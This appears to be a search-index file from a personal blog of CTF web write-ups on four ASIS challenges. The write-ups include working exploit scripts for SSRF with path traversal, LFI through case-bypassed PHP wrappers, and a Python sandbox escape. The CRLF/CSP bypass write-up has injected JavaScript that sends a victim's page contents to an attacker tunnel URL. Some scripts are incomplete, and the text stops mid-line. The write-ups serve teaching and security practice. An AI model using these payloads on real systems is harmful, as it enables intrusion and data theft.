{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"/]+|(?!\\b)(?=[A-Z][a-z])|\\.(?!\\d)|&[lg]t;","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"CTF Writeups","text":"<p>Personal blog to keep track of the past CTF challs  ( web + some crypto / OSINT) and to share with everyone.</p>"},{"location":"#recent-challenges","title":"Recent Challenges","text":""},{"location":"#asis-ctf","title":"ASIS CTF","text":"<p>I recently tackled four web exploitation challenges from ASIS CTF. Each one taught me something new about breaking (and hopefully, securing) web applications.</p> <ul> <li> <p>Sanchess</p> <p>Writeup</p> </li> <li> <p>Rick Gallery</p> <p>Writeup</p> </li> <li> <p>ASIS Mail</p> <p>Writeup</p> </li> <li> <p>Bookmarks</p> <p>Writeup</p> </li> </ul>"},{"location":"about/","title":"About","text":""},{"location":"about/#why-i-write-these","title":"Why I Write These","text":"<p>I started documenting CTF challenges because I kept forgetting the techniques I'd learned. After solving a challenge, I'd move on to the next one, and a few weeks later, I'd face a similar problem and have to figure it out all over again. Writing forces me to really understand what I did and why it worked.</p> <p>But it's become more than just personal notes. I've learned so much from other people's writeups over the years - those moments when someone explains a technique in a way that just clicks. If my writeups can do that for someone else, then the time spent writing them is worth it.</p>"},{"location":"about/#how-i-approach-security","title":"How I Approach Security","text":"<p>I'm interested in web application security, penetration testing, and vulnerability research. CTF competitions give me a safe, legal way to explore these topics without crossing ethical lines. There's something satisfying about that moment when you finally understand how a system can be broken - and more importantly, how it could have been built securely in the first place.</p>"},{"location":"about/#my-writing-process","title":"My Writing Process","text":"<p>When I write a writeup, I try to capture my actual thought process. Not the clean, perfect solution I came up with after the fact, but the messy reality of trying things that don't work, getting stuck, and eventually finding the path forward.</p> <p>I include all the code that actually worked - tested and functional. If I spent three hours debugging an exploit, I'll mention the common pitfalls so you don't have to waste that time too. And I only publish writeups after the CTF ends, out of respect for other competitors.</p>"},{"location":"about/#what-youll-find-here","title":"What You'll Find Here","text":"<p>Right now, the site focuses on web exploitation challenges. I've written about SSRF, XSS, CRLF injection, local file inclusion, path traversal, CSP bypasses, IDOR vulnerabilities, Python sandbox escapes, expression injection, and various filter evasion techniques.</p> <p>Each challenge taught me something specific, but the real learning comes from seeing patterns across multiple challenges. How the same vulnerability manifests in different contexts. How defensive techniques that work in one scenario fail in another.</p>"},{"location":"about/#the-site-itself","title":"The Site Itself","text":"<p>I built this site with MkDocs Material because I wanted something that was easy to maintain and looked professional without requiring a lot of fiddling. If you want to add your own writeups or suggest improvements, check out the Contributing Guide on GitHub.</p>"},{"location":"about/#get-in-touch","title":"Get in Touch","text":"<p>You can find me on GitHub at GougasseHamza. If you spot mistakes in my writeups or have suggestions, please open an issue. I'm still learning, and corrections help me improve.</p>"},{"location":"about/#legal-disclaimer","title":"Legal Disclaimer","text":"<p>Everything on this site is for educational purposes. The techniques I document are powerful and could cause real harm if misused. Only use them on systems you own or have explicit written permission to test.</p> <p>The challenges I write about are from CTF competitions - controlled environments specifically designed for security research. They exist so people like me can learn offensive security skills without breaking the law or hurting anyone.</p> <p>If you're learning from these writeups, please use that knowledge responsibly. The goal is to make systems more secure, not to break things for the sake of breaking them.</p> <p>Last updated: January 2026</p>"},{"location":"asis-ctf/","title":"ASIS CTF","text":"<p>ASIS CTF is one of those competitions that makes you think differently about security. Run by the Academy for Skills and Information Security team, it's known for creative challenges that go beyond the typical \"find the SQL injection\" problems. When I decided to tackle some of their web challenges, I knew I was in for a learning experience.</p>"},{"location":"asis-ctf/#what-i-worked-on","title":"What I Worked On","text":"<p>I focused on the web exploitation category, where I found four challenges that each taught me something different about breaking web applications. Some were straightforward, others had me stuck for hours. But that's exactly what makes these competitions valuable - they force you to dig deeper.</p>"},{"location":"asis-ctf/#the-challenges","title":"The Challenges","text":""},{"location":"asis-ctf/#sanchess","title":"Sanchess","text":"<p>This was a Rick and Morty themed chess game that looked innocent at first. You could program Rick's moves to reach Morty on a chess board. I quickly discovered it was vulnerable to Python expression injection - I could make the server evaluate arbitrary Python code through the move conditions.</p> <p>The interesting part came when the challenge got patched mid-competition. The organizers added filters to block keywords like \"open\" and \"read\". I had to learn about Unicode normalization bypasses, using fullwidth characters that look different but evaluate the same way. It was my first time exploiting Unicode normalization, and it completely changed how I think about filter evasion.</p> <p>Read the full writeup</p>"},{"location":"asis-ctf/#rick-gallery","title":"Rick Gallery","text":"<p>An image gallery application that seemed simple enough. It had filters to prevent accessing dangerous PHP wrappers like <code>php://</code> and <code>file://</code>. The vulnerability? The filters only checked for lowercase versions of these wrappers.</p> <p>PHP's stream wrappers are case-insensitive, so <code>PHP://</code> and <code>FILE://</code> worked perfectly while bypassing all the filters. Sometimes the most effective exploits are the simplest ones. I used this to read arbitrary files on the system and eventually found the flag in <code>/tmp/flag.txt</code>.</p> <p>Read the full writeup</p>"},{"location":"asis-ctf/#asis-mail","title":"ASIS Mail","text":"<p>This was a microservices-based email application with an API, SSO service, object storage, and nginx frontend. The attack surface was large, and I had to chain multiple vulnerabilities to reach the flag.</p> <p>First, I found SSRF in the email composition endpoint. Then I discovered path traversal in the object storage service - it checked if the bucket name was \"FLAG\" but didn't sanitize the path itself. By using my own bucket with <code>../</code> to traverse to the FLAG directory, I could read protected files.</p> <p>The clever part was discovering the flag filename by exploiting an IDOR vulnerability to read other users' emails. I could see what filenames other competitors had tried, which led me to the correct flag filename.</p> <p>Read the full writeup</p>"},{"location":"asis-ctf/#bookmarks","title":"Bookmarks","text":"<p>This was the hardest one. A Flask bookmark manager that inserted the username directly into HTTP response headers. If the username contained CRLF characters (<code>\\r\\n</code>), I could inject my own headers and even inject content into the response body.</p> <p>The breakthrough came when I realized I could push the Content-Security-Policy header into the response body by ending the headers early with <code>\\r\\n\\r\\n</code>. This meant CSP wasn't enforced, and I could execute arbitrary JavaScript.</p> <p>The timing was tricky - I had to open a popup window that would load my injected script, wait for the bot to log in as the flag user, then use <code>fetch()</code> to read the dashboard using the shared session cookie. It took several attempts to get the timing right.</p> <p>Read the full writeup</p>"},{"location":"asis-ctf/#what-i-learned","title":"What I Learned","text":"<p>These four challenges taught me more than just individual techniques. I learned how to think about chaining vulnerabilities, how simple bypasses can defeat complex filters, and how timing and state management matter in client-side attacks.</p> <p>The ASIS CTF team knows how to create challenges that simulate real-world complexity without being frustrating. Each challenge had that moment where everything clicked, and I understood not just how to exploit it, but why the vulnerability existed in the first place.</p> Challenge Difficulty Main Technique Rick Gallery Easy-Medium Case-sensitive filter bypass ASIS Mail Medium Vulnerability chaining (SSRF + Path Traversal + IDOR) Sanchess Medium-Hard Python sandbox escape, Unicode normalization Bookmarks Hard CRLF injection, CSP bypass, timing attack <p>These writeups document my learning process and are shared for educational purposes.</p>"},{"location":"asis-ctf/asis-mail/","title":"ASIS Mail - Chaining Vulnerabilities","text":"<p>Category: Web Flag: <code>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}</code></p>"},{"location":"asis-ctf/asis-mail/#the-application","title":"The Application","text":"<p>ASIS Mail was a microservices-based email application - the kind of architecture that's popular in modern web development. It had multiple services working together: an nginx frontend, a Go API server, a Node.js SSO service, a Python/Flask object storage system, and PostgreSQL for the database.</p> <p>The source code was provided, which was helpful. I could see exactly how these services communicated with each other and where the security boundaries were supposed to be.</p>"},{"location":"asis-ctf/asis-mail/#finding-the-first-vulnerability","title":"Finding the First Vulnerability","text":"<p>I started by exploring the API endpoints. The <code>/compose</code> endpoint looked interesting - it accepted XML to create email messages and could fetch attachments from URLs:</p> <pre><code>&lt;message&gt;\n    &lt;to&gt;myuser@asismail.local&lt;/to&gt;\n    &lt;subject&gt;Test&lt;/subject&gt;\n    &lt;body&gt;test content&lt;/body&gt;\n    &lt;attachment_url&gt;http://internal-service/path&lt;/attachment_url&gt;\n&lt;/message&gt;\n</code></pre> <p>This was SSRF - Server-Side Request Forgery. The API would fetch whatever URL I gave it and store the result as an attachment. But I couldn't just point it at <code>http://objectstore:8082/public/FLAG/flag.txt</code> because the object storage had checks for the FLAG bucket.</p>"},{"location":"asis-ctf/asis-mail/#the-object-storage-vulnerability","title":"The Object Storage Vulnerability","text":"<p>Looking at the object storage code, I found something interesting:</p> <pre><code>@app.route(\"/public/&lt;bucket&gt;/&lt;path:object_name&gt;\", methods=[\"GET\"])\ndef public_file(bucket, object_name):\n    if bucket == \"FLAG\":\n        return jsonify({\"error\":\"forbidden\"}), 403\n    file_path = STORAGE / bucket / object_name\n    if not file_path.exists():\n        return jsonify({\"error\":\"not found\"}), 404\n    return send_file(file_path, as_attachment=True)\n</code></pre> <p>The code checked if the bucket name was \"FLAG\", but it didn't sanitize the <code>object_name</code> parameter. This meant I could use path traversal with <code>../</code> to escape from my bucket into the FLAG bucket.</p> <p>If I used my user ID (let's say 691) as the bucket, then: <code>/public/691/../FLAG/flag-xxx.txt</code> would resolve to <code>/data/FLAG/flag-xxx.txt</code> and bypass the check.</p>"},{"location":"asis-ctf/asis-mail/#finding-the-flag-filename","title":"Finding the Flag Filename","text":"<p>But there was a problem: I didn't know the exact filename. According to the Dockerfile, the flag was renamed to <code>flag-&lt;md5sum&gt;.txt</code> where the MD5 was computed from the flag content itself.</p> <p>That's when I discovered another vulnerability - IDOR (Insecure Direct Object Reference) in the email access endpoint. I could read ANY user's email by just changing the email ID:</p> <pre><code>for email_id in range(1, 800):\n    resp = session.get(f\"{BASE_URL}/api/mail/{email_id}\", headers=headers)\n    # Check for attachments with flag filenames\n</code></pre> <p>By scanning other users' emails, I found they had tried various flag filenames. The most common one appearing was <code>flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code>. Other competitors had obviously found the filename somehow.</p> <p>I verified it existed using the hash endpoint (which didn't have the FLAG check):</p> <pre><code>GET /files/public/x/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt/hash\nResponse: {\"content\":\"a69e461b31f79128...\",\"status\":\"ok\"}\n</code></pre> <p>Perfect. The file existed.</p>"},{"location":"asis-ctf/asis-mail/#chaining-it-all-together","title":"Chaining It All Together","text":"<p>Now I had all the pieces: 1. SSRF in the compose endpoint 2. Path traversal in object storage 3. The correct flag filename</p> <p>I registered a new account and used the compose endpoint to fetch the flag via SSRF:</p> <pre><code>username = f\"exploit_{random_string()}\"\nsession.post(f\"{BASE_URL}/sso/register\", json={\"username\": username, \"password\": password})\nresp = session.post(f\"{BASE_URL}/sso/login\", json={\"username\": username, \"password\": password})\nuser_id = resp.json().get(\"user\", {}).get(\"userId\")\n\n# Use path traversal with my own user ID as the bucket\nssrf_url = f\"http://objectstore:8082/public/{user_id}/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt\"\n\nxml = f'''&lt;message&gt;\n    &lt;to&gt;{username}@asismail.local&lt;/to&gt;\n    &lt;subject&gt;GetFlag&lt;/subject&gt;\n    &lt;body&gt;flag&lt;/body&gt;\n    &lt;attachment_url&gt;{ssrf_url}&lt;/attachment_url&gt;\n&lt;/message&gt;'''\n\nsession.post(f\"{BASE_URL}/api/compose\", headers=headers, files={\"xml\": (None, xml)})\n</code></pre> <p>The API made the request internally (bypassing nginx restrictions), the path traversal worked, and the flag was stored as an attachment in my inbox. I retrieved it from my email:</p> <pre><code>ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}\n</code></pre>"},{"location":"asis-ctf/asis-mail/#the-exploit","title":"The Exploit","text":"<p>Here's the complete exploit:</p> <pre><code>#!/usr/bin/env python3\nimport requests\nimport random\nimport string\nimport time\n\nBASE_URL = \"http://91.107.143.167:8081\"\nFLAG_FILENAME = \"flag-0750c96cfc2bd4b665865da15e9d5b94.txt\"\n\ndef random_string(length=8):\n    return ''.join(random.choices(string.ascii_lowercase, k=length))\n\ndef main():\n    session = requests.Session()\n\n    # Register and login\n    username = f\"exploit_{random_string()}\"\n    password = \"ExploitPass123!\"\n\n    session.post(f\"{BASE_URL}/sso/register\", json={\"username\": username, \"password\": password})\n    resp = session.post(f\"{BASE_URL}/sso/login\", json={\"username\": username, \"password\": password})\n    data = resp.json()\n    token = data.get(\"token\")\n    user_id = data.get(\"user\", {}).get(\"userId\")\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    my_email = f\"{username}@asismail.local\"\n\n    print(f\"User: {username} (ID: {user_id})\")\n\n    # SSRF with path traversal using our own bucket\n    ssrf_url = f\"http://objectstore:8082/public/{user_id}/../FLAG/{FLAG_FILENAME}\"\n\n    xml = f'''&lt;message&gt;\n    &lt;to&gt;{my_email}&lt;/to&gt;\n    &lt;subject&gt;GetFlag&lt;/subject&gt;\n    &lt;body&gt;flag&lt;/body&gt;\n    &lt;attachment_url&gt;{ssrf_url}&lt;/attachment_url&gt;\n&lt;/message&gt;'''\n\n    resp = session.post(f\"{BASE_URL}/api/compose\", headers=headers, files={\"xml\": (None, xml)})\n    print(f\"Compose: {resp.status_code}\")\n\n    time.sleep(1)\n\n    # Retrieve flag from inbox\n    resp = session.get(f\"{BASE_URL}/api/inbox\", headers=headers)\n    for email in resp.json():\n        if email.get(\"subject\") == \"GetFlag\":\n            email_resp = session.get(f\"{BASE_URL}/api/mail/{email['id']}\", headers=headers)\n            email_data = email_resp.json()\n\n            for att in email_data.get(\"attachments\", []):\n                att_url = f\"/files{att.get('url')}\"\n                r = session.get(f\"{BASE_URL}{att_url}\")\n                if \"ASIS{\" in r.text:\n                    print(f\"\\nFLAG: {r.text}\")\n                    return\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"asis-ctf/bookmarks/","title":"Bookmarks - Breaking CSP with CRLF","text":"<p>Category: Web Exploitation Flag: <code>FLAG{...}</code></p>"},{"location":"asis-ctf/bookmarks/#the-challenge","title":"The Challenge","text":"<p>Bookmarks was a Flask application for managing bookmarks. Users could register, login, and save bookmarks to their dashboard. The interesting part was that it had a bot , when you reported a URL, a headless browser would visit it, register as a user with the flag as the username, log in, and browse around.</p> <p>My goal was to steal that username (the flag) from the bot's session.</p>"},{"location":"asis-ctf/bookmarks/#the-bots-behavior","title":"The Bot's Behavior","text":"<p>Looking at the bot code, I could see the sequence:</p> <ol> <li>Bot visits my reported URL</li> <li>Waits 5 seconds</li> <li>Navigates to <code>/register</code> and creates an account with FLAG as the username</li> <li>Navigates to <code>/login</code> and logs in</li> <li>The dashboard displays \"Welcome, FLAG!\"</li> </ol> <p>The flag would appear on the dashboard, but only the bot could see it. I needed to somehow read the bot's dashboard.</p>"},{"location":"asis-ctf/bookmarks/#finding-the-vulnerability","title":"Finding the Vulnerability","text":"<p>I examined the Flask application code and found something interesting in the <code>/dashboard</code> route:</p> <pre><code>@app.route(\"/dashboard\", methods=['GET'])\ndef dashboard():\n    user_id = session.get(\"user_id\")\n    username = None\n    with sqlite3.connect(DB_NAME) as conn:\n        cur = conn.execute(\"SELECT username FROM users WHERE id = ?\", (user_id,))\n        user = cur.fetchone()\n        username = user[0] if user else None\n\n    rendered = render_template(\"dashboard.html\", username=username)\n    response = make_response(rendered)\n    response.headers['X-User-' + username] = user_id  # VULNERABLE LINE\n\n    return response\n</code></pre> <p>The username was being inserted directly into an HTTP response header name: <code>X-User-{username}</code>.</p> <p>If I registered with a username containing CRLF characters (<code>\\r\\n</code>), I could: 1. End the current header 2. Inject new headers 3. End ALL headers with <code>\\r\\n\\r\\n</code> 4. Inject content into the response body</p>"},{"location":"asis-ctf/bookmarks/#testing-crlf-injection","title":"Testing CRLF Injection","text":"<p>I created a test account with this username:</p> <pre><code>test\\r\\n\\r\\n&lt;h1&gt;INJECTED&lt;/h1&gt;&lt;!--\n</code></pre> <p>When I visited <code>/dashboard</code>, the response looked like this:</p> <pre><code>HTTP/1.1 200 OK\nX-User-test\n\n&lt;h1&gt;INJECTED&lt;/h1&gt;&lt;!--: 12345\nContent-Security-Policy: default-src 'none'; style-src 'self';\n... rest of response\n</code></pre> <p>The CSP header ended up in the response body, not as an actual header. This meant CSP wasn't being enforced, and I could execute JavaScript.</p>"},{"location":"asis-ctf/bookmarks/#the-timing-challenge","title":"The Timing Challenge","text":"<p>My attack needed careful timing:</p> <ol> <li>At 0 seconds: Bot visits my exploit page</li> <li>At 0 seconds: My page opens a popup and logs in as my CRLF user</li> <li>At 2 seconds: Popup navigates to <code>/dashboard</code> with my injected script</li> <li>At 5 seconds: Bot (main window) navigates to <code>/register</code></li> <li>At 6 seconds: Bot logs in - session cookie is now set</li> <li>At 8-12 seconds: My injected script runs <code>fetch(\"/dashboard\")</code> using the shared session cookie</li> </ol> <p>The key insight was that popup windows share the same cookie jar as their opener. Even though I couldn't read <code>window.opener.document</code> due to same-origin policy restrictions after navigation, I could still make <code>fetch()</code> requests that used the bot's session cookie.</p>"},{"location":"asis-ctf/bookmarks/#the-exploit","title":"The Exploit","text":"<p>I created a malicious username with injected JavaScript:</p> <pre><code>def build_malicious_username():\n    script = \"\"\"\nvar T=\"https://my-tunnel-url.com\";\nfunction P(m){new Image().src=T+\"/c?m=\"+encodeURIComponent(m);}\nP(\"Script loaded\");\nfunction go(){\n    P(\"Fetching dashboard\");\n    fetch(\"/dashboard\").then(function(r){return r.text();}).then(function(h){\n        var m=h.match(/Welcome,([^&lt;]+)/);\n        if(m) P(\"FLAG:\"+m[1].trim());\n        else P(\"No match:\"+h.substr(0,100));\n    }).catch(function(e){P(\"Error:\"+e);});\n}\nsetTimeout(go,8000);\nsetTimeout(go,10000);\nsetTimeout(go,12000);\nP(\"Timers set\");\n\"\"\".replace(\"\\n\", \"\")\n\n    return f\"user\\r\\n\\r\\n&lt;script&gt;{script}&lt;/script&gt;&lt;!--\"\n</code></pre> <p>My exploit page opened a popup, logged in as the CRLF user, then navigated the popup to <code>/dashboard</code>. The navigation triggered the CRLF injection, my script loaded (CSP bypassed), and after waiting for the bot to log in, my script fetched <code>/dashboard</code> and extracted the flag from the Welcome message.</p> <p>The complete attack flow:</p> <pre><code>#!/usr/bin/env python3\nimport http.server\nimport requests\nimport base64\nimport threading\nimport time\nimport random\nimport string\n\nTARGET_URL = \"http://65.109.202.184\"\nINTERNAL_ORIGIN = \"http://web\"\nTUNNEL_URL = \"https://your-tunnel.trycloudflare.com\"\n\ndef main():\n    # Step 1: Register CRLF user\n    print(\"[1] Registering CRLF user...\")\n    requests.post(f\"{TARGET_URL}/register\",\n                  data={\"username\": MALICIOUS_USERNAME, \"password\": PASSWORD})\n\n    # Step 2: Verify injection works\n    print(\"[2] Verifying injection...\")\n    s = requests.Session()\n    s.post(f\"{TARGET_URL}/login\",\n           data={\"username\": MALICIOUS_USERNAME, \"password\": PASSWORD})\n    r = s.get(f\"{TARGET_URL}/dashboard\")\n\n    if \"&lt;script&gt;\" in r.text:\n        print(\"    [+] CRLF injection verified!\")\n    else:\n        print(\"    [-] Injection failed!\")\n        return\n\n    # Step 3: Start exploit server\n    print(\"[3] Starting server...\")\n    server = socketserver.TCPServer((\"0.0.0.0\", 8000), Handler)\n    threading.Thread(target=server.serve_forever, daemon=True).start()\n\n    # Step 4: Trigger bot\n    print(\"[4] Triggering bot...\")\n    requests.post(f\"{TARGET_URL}/report\",\n                  data={\"url\": f\"{TUNNEL_URL}/exploit.html\"})\n\n    print(\"\\n[*] Waiting for flag...\\n\")\n\n    while True:\n        time.sleep(1)\n</code></pre> <p>After a few seconds, I saw the callback with the flag:</p> <pre><code>[&gt;] Script loaded\n[&gt;] Timers set\n[&gt;] Fetching dashboard\n[&gt;] FLAG:FLAG{...}\n</code></pre>"},{"location":"asis-ctf/bookmarks/#takeaways","title":"takeaways","text":"<p>Defense: The vulnerability existed because: 1. User input (username) was directly concatenated into HTTP header names 2. No validation for special characters like <code>\\r</code> and <code>\\n</code> 3. Python's <code>response.headers[key] = value</code> doesn't sanitize the key</p> <p>The fix would be to either: - Sanitize all user input that goes into headers - Use a safe templating method for headers - Validate usernames to reject control characters</p>"},{"location":"asis-ctf/rick-gallery/","title":"Rick Gallery - The Case Sensitivity Trap","text":"<p>Category: Web Flag: <code>ASIS{...}</code></p>"},{"location":"asis-ctf/rick-gallery/#the-gallery","title":"The Gallery","text":"<p>Rick Gallery was presented as a simple image gallery application with a Rick and Morty theme. When I first loaded it, I saw a collection of images and could click through them. The source code was provided, which made things easier.</p> <p>Looking at the PHP code, I found three main files: - <code>index.php</code> - The main gallery interface - <code>getpic.php</code> - An internal service to fetch images - <code>.htaccess</code> - Apache configuration restricting direct access to <code>getpic.php</code></p>"},{"location":"asis-ctf/rick-gallery/#finding-the-vulnerability","title":"Finding the Vulnerability","text":"<p>The interesting part was in <code>index.php</code>. When processing POST requests, it checked for an <code>Image</code> header and ran it through some filters:</p> <pre><code>$blockedProtocols = [\n    \"http://\", \"https://\", \"ftp://\", \"ftps://\",\n    \"file://\", \"data://\", \"expect://\", \"php://\",\n    \"passwd\"\n];\n\nforeach ($blockedProtocols as $proto) {\n    if (strpos($raw, $proto) !== false) {\n        $raw = \"\";\n        break;\n    }\n}\n</code></pre> <p>The application was trying to prevent me from using dangerous PHP wrappers like <code>php://</code> or <code>file://</code> to read arbitrary files. But I noticed something: all the blocked strings were lowercase.</p> <p>I remembered that PHP stream wrappers are case-insensitive. So while <code>php://filter/read=convert.base64-encode/resource=/etc/passwd</code> would be blocked, <code>PHP://filter/read=convert.base64-encode/resource=/etc/passwd</code> would sail right through the filter.</p>"},{"location":"asis-ctf/rick-gallery/#testing-the-theory","title":"Testing the Theory","text":"<p>I started with a simple test. I sent a POST request with the <code>Image</code> header set to <code>/etc/hostname</code> (no wrapper needed for absolute paths):</p> <pre><code>import requests\nimport base64\n\nTARGET = \"http://65.109.194.105:8080/index.php\"\n\nheaders = {\"Image\": \"/etc/hostname\"}\nr = requests.post(TARGET, headers=headers)\ncontent = base64.b64decode(r.text.strip())\nprint(content)\n# Output: b'7be458eda235\\n'\n</code></pre> <p>It worked. The application was passing my input to <code>file_get_contents()</code> in <code>getpic.php</code>, which happily read any file I specified.</p>"},{"location":"asis-ctf/rick-gallery/#hunting-for-the-flag","title":"Hunting for the Flag","text":"<p>Now I had local file inclusion, but I needed to find where the flag was stored. I started checking common locations:</p> <pre><code>def read_file(path):\n    headers = {\"Image\": path}\n    r = requests.post(TARGET, headers=headers)\n    if '&lt;br /&gt;' in r.text or 'Warning' in r.text:\n        return None\n    return base64.b64decode(r.text.strip())\n\n# Tried various paths\nread_file(\"/flag.txt\")           # Not found\nread_file(\"/etc/passwd\")         # Blocked by \"passwd\" filter\nread_file(\"/proc/self/environ\")  # Found, but no flag\nread_file(\"/var/www/flag.txt\")   # Not found\n</code></pre> <p>I kept enumerating different paths. CTF flags are often placed in obvious but sometimes overlooked locations. After trying several standard paths, I checked <code>/tmp/</code>:</p> <pre><code>content = read_file(\"/tmp/flag.txt\")\nprint(content.decode())\n# ASIS{...}\n</code></pre> <p>There it was. The flag was sitting in <code>/tmp/flag.txt</code> the whole time.</p>"},{"location":"asis-ctf/rick-gallery/#the-exploit","title":"The Exploit","text":"<p>Here's the final exploit script:</p> <pre><code>#!/usr/bin/env python3\nimport requests\nimport base64\nimport sys\n\ndef read_file(target, path):\n    if not target.endswith('.php'):\n        target = target.rstrip('/') + '/index.php'\n\n    headers = {\"Image\": path}\n    r = requests.post(target, headers=headers, timeout=10)\n\n    # Check for error response\n    if '&lt;br /&gt;' in r.text or 'Warning' in r.text:\n        return None\n\n    try:\n        decoded = base64.b64decode(r.text.strip())\n        if b'Warning' in decoded:\n            return None\n        return decoded\n    except:\n        return None\n\ndef main():\n    target = sys.argv[1] if len(sys.argv) &gt; 1 else \"http://target:8080/\"\n\n    # Read the flag\n    flag = read_file(target, \"/tmp/flag.txt\")\n\n    if flag:\n        print(f\"[+] FLAG: {flag.decode()}\")\n    else:\n        print(\"[-] Flag not found at /tmp/flag.txt\")\n\n        # Try alternative locations\n        alternatives = [\n            \"/flag.txt\",\n            \"/flag\",\n            \"/home/flag.txt\",\n            \"/var/www/flag.txt\",\n            \"/root/flag.txt\",\n        ]\n\n        for path in alternatives:\n            content = read_file(target, path)\n            if content:\n                print(f\"[+] Found at {path}: {content.decode()}\")\n                break\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"asis-ctf/rick-gallery/#references","title":"References","text":"<ul> <li>PHP Stream Wrappers Documentation</li> <li>HackTricks - File Inclusion</li> <li>PayloadsAllTheThings - File Inclusion</li> </ul>"},{"location":"asis-ctf/sanchess/","title":"Sanchess - Making Rick Angry","text":"<p>Category: Web Exploitation Flag: <code>ASIS{y0u_M2D3_r!cK_@NGRY}</code></p>"},{"location":"asis-ctf/sanchess/#first-impressions","title":"First Impressions","text":"<p>The challenge description was cryptic: \"Guide Rick through the shadows to discover Morty, armed only with peculiar tools.\" When I loaded the page, I found a Rick and Morty themed chess-like game. Rick stood on one corner of an 8x8 board, and Morty was somewhere else. My job was to program Rick's moves to reach Morty.</p> <p>What made it interesting was the move system. I could create simple moves like \"up\" or \"down\", but I could also create conditional moves - if some condition was true, move in one direction, otherwise move in another direction. The conditions could check things like the distance to Morty or the color of the current cell.</p>"},{"location":"asis-ctf/sanchess/#finding-the-injection","title":"Finding the Injection","text":"<p>I started poking at the <code>/simulate</code> endpoint, which accepted JSON describing Rick's moves. The conditional moves were particularly interesting because they had a <code>value</code> field that was compared against the calculated distance.</p> <p>I tried a simple test: <pre><code>{\"type\": \"distance\", \"op\": \"&gt;\", \"value\": \"1+1\"}\n</code></pre></p> <p>Rick moved! The server had evaluated <code>1+1</code> to <code>2</code> and compared the distance against it. This was Python expression injection - I could make the server evaluate arbitrary Python code.</p> <p>I tested what functions were available: <pre><code>{\"type\": \"distance\", \"op\": \"&gt;\", \"value\": \"len('hello')\"}  # Works - evaluates to 5\n{\"type\": \"distance\", \"op\": \"&gt;\", \"value\": \"int('10')\"}     # Works - evaluates to 10\n</code></pre></p> <p>But when I tried dangerous functions like <code>open()</code> or <code>__import__()</code>, they were blocked. The application had some kind of filter or sandbox.</p>"},{"location":"asis-ctf/sanchess/#breaking-out","title":"Breaking Out","text":"<p>Since I couldn't use <code>open()</code> directly, I needed to find another way to read files. Python's class hierarchy is famous for sandbox escapes. Every object in Python inherits from a base class, and by traversing the subclasses, you can sometimes find dangerous functionality that wasn't explicitly blocked.</p> <p>I tried this expression: <pre><code>().__class__.__base__.__subclasses__()\n</code></pre></p> <p>This gave me access to all loaded Python classes. I scrolled through them looking for something useful. Then I found it: <code>FileLoader</code>. This is a class from Python's import system, and it has a <code>get_data()</code> method that can read files.</p> <p>The expression looked like this: <pre><code>[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\n</code></pre></p> <p>This found the FileLoader class, instantiated it, and called <code>get_data()</code> to read the flag file. But I couldn't just read the flag directly - I needed to extract it one character at a time using a boolean oracle.</p>"},{"location":"asis-ctf/sanchess/#the-boolean-oracle","title":"The Boolean Oracle","text":"<p>The challenge used Manhattan distance to calculate how far Rick was from Morty. With Rick at position (0,0) and Morty at (7,1), the distance was 8.</p> <p>When I created a conditional move with <code>distance &gt; value</code>, the server would: - Move Rick DOWN if the condition was TRUE (distance &gt; value) - Move Rick UP if the condition was FALSE (distance &lt;= value)</p> <p>So I could tell if my expression evaluated to less than 8 or not by watching which direction Rick moved.</p> <p>My strategy was to read one character of the flag at a time and multiply the comparison result by 100: <pre><code>(flag_bytes[position] == ascii_code) * 100\n</code></pre></p> <p>If the character matched, this would evaluate to 100, and <code>8 &gt; 100</code> would be FALSE (Rick moves UP). If the character didn't match, this would evaluate to 0, and <code>8 &gt; 0</code> would be TRUE (Rick moves DOWN).</p> <p>So Rick moving UP meant I found the right character.</p>"},{"location":"asis-ctf/sanchess/#the-first-flag","title":"The First Flag","text":"<p>I wrote a Python script to automate the extraction:</p> <pre><code>def check_char(pos, char_code):\n    byte_expr = \"[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\"\n    expr = f\"({byte_expr}[{pos}]=={char_code})*100\"\n\n    payload = {\n        \"rick\": {\"row\": 0, \"col\": 0},\n        \"morty\": {\"row\": 7, \"col\": 1},\n        \"moves\": [{\n            \"type\": \"conditional\",\n            \"condition\": {\"type\": \"distance\", \"op\": \"&gt;\", \"value\": expr},\n            \"then\": \"down\",\n            \"else\": \"up\"\n        }]\n    }\n\n    r = session.post(f\"{BASE_URL}/simulate\", json=payload)\n    path = r.json().get(\"path\", [])\n\n    # UP (row stays 0) means match found\n    return path[1]['row'] == 0\n</code></pre> <p>I ran it and watched the flag appear character by character: <pre><code>A\nAS\nASI\nASIS\nASIS{\nASIS{y\nASIS{y0\n...\nASIS{y0u_M2D3_r!cK_@NGRY}\n</code></pre></p> <p>Perfect. But then something changed.</p>"},{"location":"asis-ctf/sanchess/#the-patch","title":"The Patch","text":"<p>The challenge organizers patched it mid-competition. They added filters to block keywords like \"open\", \"read\", \"flag\", \"eval\", and even underscores. My FileLoader approach no longer worked.</p> <p>I was stuck for a while. Then I remembered something I'd read about Unicode normalization attacks.</p>"},{"location":"asis-ctf/sanchess/#unicode-normalization-bypass","title":"Unicode Normalization Bypass","text":"<p>Many web frameworks normalize Unicode characters before processing them. There's a range of Unicode characters called \"fullwidth\" characters (U+FF01 to U+FF5E) that look slightly different but normalize to regular ASCII.</p> <p>For example: - <code>\uff4f\uff50\uff45\uff4e</code> (fullwidth) normalizes to <code>open</code> (ASCII) - <code>\uff52\uff45\uff41\uff44</code> (fullwidth) normalizes to <code>read</code> (ASCII)</p> <p>The key insight: the filter checked for \"open\" and \"read\" before normalization, but Python evaluated the expression after normalization.</p> <p>I wrote a function to convert ASCII to fullwidth: <pre><code>def 